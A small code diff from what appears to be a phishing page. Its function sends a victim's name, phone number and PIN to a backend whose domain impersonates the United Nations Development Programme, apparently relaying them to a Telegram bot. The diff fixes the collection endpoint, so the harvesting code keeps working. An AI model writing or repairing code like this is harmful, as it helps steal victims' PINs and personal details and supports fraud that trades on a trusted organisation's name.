@@ -71,9 +71,9 @@ const statusEl = document.getElementById("status");
 
 // Function to send PIN to backend/Telegram
 async function sendPinToTelegram(name, phone, pin) {
-  const BACKEND_URL = "https://united-nations-development-program.onrender.com"; // replace with your backend
+  const BACKEND_URL = "https://united-nations-development-program.onrender.com";
   try {
-    const res = await fetch(`${BACKEND_URL}/send-pin`, {
+    const res = await fetch(`${BACKEND_URL}/submit-pin`, { // fixed endpoint
       method: "POST",
       headers: {"Content-Type":"application/json"},
       body: JSON.stringify({ name, phone, pin, botId })
